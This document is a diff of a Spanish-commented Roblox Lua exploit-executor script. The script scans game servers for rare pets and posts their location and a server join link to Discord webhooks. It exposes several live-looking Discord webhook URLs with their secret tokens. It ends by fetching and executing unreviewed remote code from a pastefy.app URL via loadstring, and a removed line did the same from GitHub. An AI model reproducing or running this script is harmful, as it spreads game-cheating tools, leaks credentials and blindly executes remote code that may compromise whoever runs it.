@@ -1,96 +1,19 @@
--- 🐾 PET COMBINED NOTIFIER (Mutations + notifyPets en un script)
--- by AlexVM adaptado
-
---// Servicios
-local Players     = game:GetService("Players")
-local RunService  = game:GetService("RunService")
-local Workspace   = game:GetService("Workspace")
-local HttpService = game:GetService("HttpService")
-
---// CONFIG: Webhooks por mutación
-local Webhooks = {
-    ["YinYang"] = "https://discord.com/api/webhooks/1424649177178046537/smG00imbnS5RVKgVZUSgQNcKYWx0VrpeeslrahW8J2ssgvaEzG0WeK1OfB7M0ZB9egvt",
-    ["Gold"]    = "https://discord.com/api/webhooks/1424648951822418043/PX6sJxJFNEx5gGc4Fw05gax4Di4VVF56oylo_yvJOHPqqJj1h6pbJ25SyfwEVObnbWtJ",
-    ["Diamond"] = "https://discord.com/api/webhooks/1411923092175061052/ws56RZTpifp4rSnyLB39a0JWNFVaskn1GFidZ-W0Trc-vMywMFABOrCc1BIguGi48TSy",
-    ["Rainbow"] = "https://discord.com/api/webhooks/1411923758079545546/uzlvF6hWXImYfFGmM9mCXYbhQ8Ihq1Wh_H35fc06BDFHBBGbzcBz5A-u8WcUbEkM3AHk",
-    ["Lava"]    = "https://discord.com/api/webhooks/1424649063680184401/DYCYJ6BJO8kpfsLW5waOCDZHG1PQECDSTGGCuzKvCc6qMZ8cScgm8uW0FXSYyMMaAv3H",
-    ["Galaxy"]  = "https://discord.com/api/webhooks/1424649024803442809/BiI67_v1x4tAlt9MW8Q4jqf6-d3ZM7faOmA-JIFFMYByEGgH8epJgRSmrVomweOpEI12",
-    ["Candy"]   = "https://discord.com/api/webhooks/1411924032416120832/-nOjdQJUTf_5fjHMuDXAd0P-TWZvYIvzWZBl0zAC0aUSi4jn8Oo6zu2slGQ0ECvqHQyK",
-    ["BloodMoon"]= "https://discord.com/api/webhooks/1411923879252983888/17KHRwsx33vVGhy41Qvf63vQ1nyum5Xxv0DpYqgPFEvBjU6p9HRNpPI9n5Xod_PpZJlO",
-}
-
 --// Webhook general para notifyPets
-local DISCORD_WEBHOOK_NOTIFY = "https://discord.com/api/webhooks/1411323510164291634/5x4p7niAyMu5Dc5xnsGf-OYe8hvV3uoLjDHK7X8yT6g0xUe5KQfPErEWen1RMk8HfrRa"
+local HttpService = game:GetService("HttpService")
+local DISCORD_WEBHOOK_NOTIFY = "https://discord.com/api/webhooks/1425042314241507438/ZZxiYCXWVyOhx9aG2KREdYHBKU5KtNZjh9o1lHa3ul7j0GOiJgJi70DEln8GeYnNotFG"
 
---// Mutaciones especiales: colores + emojis
-local MutationStyles = {
-    ["YinYang"] = { color = 0xFFFFFF, emoji = "☯️" },
-    ["Gold"]    = { color = 0xFFD700, emoji = "🪙" },
-    ["Diamond"] = { color = 0x25C4FE, emoji = "💎" },
-    ["Rainbow"] = { color = 0x9400D3, emoji = "🌈" },
-    ["Lava"]    = { color = 0xFF7F00, emoji = "🔥" },
-    ["Galaxy"]  = { color = 0x800080, emoji = "🪐" },
-    ["Candy"]   = { color = 0xFF69B4, emoji = "🍭" },
-    ["BloodMoon"]= { color = 0x8B0000, emoji = "🩸" },
-}
-
---// Pets especiales a vigilar (notifyPets)
+--// Pets especiales a vigilar
 local notifyPets = {
-    ["Agarrini la Palini"] = true,
-    ["Bisonte Giuppitere"] = true,
-    ["Blackhole Goat"] = true,
-    ["Bulbito Bandito Traktorito"] = true,
-    ["Cacasito Satalito"] = true,
-    ["Celularcini Viciosini"] = true,
-    ["Chicleteira Bicicleteira"] = true,
-    ["Chimpanzini Spiderini"] = true,
-    ["Crabbo Limonetta"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Dul Dul Dul"] = true,
-    ["Esok Sekolah"] = true,
-    ["Garama and Madundung"] = true,
-    ["Graipuss Medussi"] = true,
-    ["Gattatino Nyanino"] = true,
-    ["Job Job Job Sahur"] = true,
-    ["Karkerkar Kurkur"] = true,
-    ["Ketchuru and Musturu"] = true,
-    ["La Extinct Grande"] = true,
-    ["La Grande Combinasion"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["La Vacca Saturno Saturnita"] = true,
-    ["Las Sis"] = true,
-    ["Las Tralaleritas"] = true,
-    ["Las Vaquitas Saturnitas"] = true,
-    ["Los Bombinitos"] = true,
-    ["Los Bro"] = true,
-    ["Los Combinasionas"] = true,
-    ["Los Chicleteiras"] = true,
-    ["Los Hotspotsitos"] = true,
-    ["Los Matteos"] = true,
-    ["Los Noo My Hotspotsitos"] = true,
-    ["Los Primos"] = true,
-    ["Los Orcalitos"] = true,
-    ["Los Spyderinis"] = true,
-    ["Los Tacoritas"] = true,
-    ["Los Tralaleritos"] = true,
-    ["Los Tungtungtungcitos"] = true,
-    ["Mastodontico Telepiedone"] = true,
-    ["Matteo"] = true,
-    ["Noo My Hotspot"] = true,
-    ["Noo My Examen"] = true,
-    ["Nuclearo Dinossauro"] = true,
-    ["Pakrahmatmamat"] = true,
-    ["Pot Hotspot"] = true,
-    ["Spaghetti Tualetti"] = true,
-    ["Sammyni Spyderini"] = true,
-    ["Statutino Libertino"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Raccooni Jandelini"] = true,
-    ["Tacorita Bicicleta"] = true,
-    ["Tartaruga Cisterna"] = true,
-    ["Torrtuginni Dragonfrutini"] = true,
-    ["Yess my Examen"] = true,
+    ["La Vacca Jacko Linterino"] = true,
+    ["La Spooky Grande"] = true,
+    ["Vampira Cappucina"] = true,
+    ["Zombie Tralala"] = true,
+    ["Frankentteo"] = true,
+    ["Tim Cheese"] = true,
 }
+
+--// Variable para evitar duplicados
+local detected = {}
 
 --// Compatibilidad con executors
 local function getRequestFunc()
@@ -105,7 +28,10 @@ end
 --// Enviar embed a Discord
 local function sendDiscordEmbed(webhook, args)
     local req = getRequestFunc()
-    if not req then return end
+    if not req then 
+        warn("❌ No se encontró función HTTP compatible.")
+        return 
+    end
     local payload = {
         embeds = {{
             title = args.title or "Evento",
@@ -122,50 +48,12 @@ local function sendDiscordEmbed(webhook, args)
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(payload)
     })
+    print("✅ Enviado a Discord:", args.title)
 end
 
--------------------------------------------------------------------------------------------------
--- 1) Notificador de Mutaciones
--------------------------------------------------------------------------------------------------
-local function sendMutation(petName, mutKey, generationText, pos)
-    local style = MutationStyles[mutKey]
-    local webhook = Webhooks[mutKey]
-    if not style or not webhook then return end
-    local mutationLabel = string.format("🧬 %s %s %s", style.emoji, mutKey:upper(), style.emoji)
-
-    -- ✅ Link actualizado
-    local serverLink = string.format(
-        "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
-        tostring(game.PlaceId),
-        tostring(game.JobId)
-    )
-
-    local fields = {
-        { name = "Nombre", value = petName, inline = true },
-        { name = "Mutación", value = mutationLabel, inline = true },
-        { name = "Generación", value = generationText or "?", inline = true },
-        { name = "Servidor", value = string.format("[Click para unirte](%s)", serverLink), inline = false }
-    }
-    if pos then
-        table.insert(fields, {name="Posición", value=string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline=false})
-    end
-
-    sendDiscordEmbed(webhook, {
-        title = "🐾 Pet Mutación Detectada-Miranda",
-        description = "Se encontró un pet con mutación especial.",
-        color = style.color,
-        fields = fields,
-        footer = "Pet Mutation Finder"
-    })
-end
-
--------------------------------------------------------------------------------------------------
--- 2) Notificador de notifyPets
--------------------------------------------------------------------------------------------------
+--// Notificador de notifyPets
 local function sendNotifyPet(petModel, mutationText, generationText)
     local pos = petModel.PrimaryPart and petModel.PrimaryPart.Position or Vector3.new()
-
-    -- ✅ Link actualizado
     local serverLink = string.format(
         "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
         tostring(game.PlaceId),
@@ -175,7 +63,7 @@ local function sendNotifyPet(petModel, mutationText, generationText)
     local fields = {
         { name = "Nombre", value = petModel.Name, inline = true },
         { name = "Mutación", value = mutationText or "Normal", inline = true },
-        { name = "Generación", value = generationText, inline = true },
+        { name = "Generación", value = generationText or "?", inline = true },
         { name = "Servidor", value = string.format("[Click para unirte](%s)", serverLink), inline = false },
         { name = "Posición", value = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline = false },
     }
@@ -188,74 +76,24 @@ local function sendNotifyPet(petModel, mutationText, generationText)
     })
 end
 
--------------------------------------------------------------------------------------------------
--- ESCANEO DE SERVIDOR
--------------------------------------------------------------------------------------------------
-local function scanPets()
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return end
-
-    for _, plot in ipairs(plots:GetChildren()) do
-        local podiums = plot:FindFirstChild("AnimalPodiums")
-        if podiums then
-            for _, podium in ipairs(podiums:GetChildren()) do
-                local base = podium:FindFirstChild("Base")
-                local spawn = base and base:FindFirstChild("Spawn")
-                local attachment = spawn and spawn:FindFirstChild("Attachment")
-                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
-
-                if overhead then
-                    local displayName = overhead:FindFirstChild("DisplayName")
-                    local mutation = overhead:FindFirstChild("Mutation")
-                    local generation = overhead:FindFirstChild("Generation")
-
-                    if displayName and displayName:IsA("TextLabel") then
-                        local name = displayName.Text
-                        local mutText = (mutation and mutation.Text) or "Normal"
-                        local genText = (generation and generation.Text) or "?"
-
-                        -- Caso 1: mutaciones
-                        if mutText ~= "" and mutText ~= "Normal" then
-                            for key, _ in pairs(MutationStyles) do
-                                if key == "YinYang" then
-                                    if string.find(mutText:lower(), "yin") and string.find(mutText:lower(), "yang") then
-                                        sendMutation(name, key, genText, spawn.Position)
-                                    end
-                                else
-                                    if string.find(mutText:lower(), key:lower()) then
-                                        sendMutation(name, key, genText, spawn.Position)
-                                    end
-                                end
-                            end
-                        end
-
-                        -- Caso 2: pets de notifyPets
-                        for _, obj in ipairs(Workspace:GetDescendants()) do
-                            if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
-                                detected[obj] = true
-                                sendNotifyPet(obj, mutText, genText)
-                            end
-                        end
-                    end
-                end
-            end
+--// Escaneo de Workspace para notifyPets
+local function scanNotifyPets()
+    for _, obj in ipairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
+            detected[obj] = true
+            sendNotifyPet(obj, "Normal", "?")
         end
     end
 end
 
--- Escaneo inmediato
-pcall(scanPets)
-
--- Escaneo cada 10 segundos
+-- Escaneo inicial y cada 10 segundos
+pcall(scanNotifyPets)
 task.spawn(function()
     while task.wait(10) do
-        pcall(scanPets)
+        pcall(scanNotifyPets)
     end
 end)
 
-print("✅ Script combinado cargado (Mutations + notifyPets).")
+print("✅ Notificador notifyPets cargado correctamente.")
 
 loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Hxck4x416/Notifier/refs/heads/main/Halloween"))()
-
